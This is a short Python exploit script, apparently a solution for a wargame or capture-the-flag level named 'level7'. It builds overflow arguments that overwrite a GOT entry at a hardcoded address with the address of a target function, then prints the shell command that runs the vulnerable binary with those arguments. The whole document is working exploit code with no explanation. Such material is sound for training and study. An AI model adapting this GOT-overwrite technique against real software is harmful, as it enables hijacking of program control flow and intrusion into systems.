#!/usr/bin/env python3

from struct import pack

def isprint(c): return c >= 0x20 and c <= 0x7e
def p(x): return pack('<I', x)

got_rewrite = 0x08049928
target_addr = 0x080484f4

payload1 = b'A' * 0x10
payload1 += p(got_rewrite)
payload1 += p(got_rewrite)
payload1 += b"\0"
payload2 = p(target_addr)
payload2 += b"\0"

print("./level7 \"$(echo -en '", end='')

for c in payload1:
    if isprint(c): print(chr(c), end='')
    else: print("\\x%02x" % c, end='')
print("')\" \"$(echo -en '", end='')

for c in payload2:
    if isprint(c): print(chr(c), end='')
    else: print("\\x%02x" % c, end='')
print("')\"")
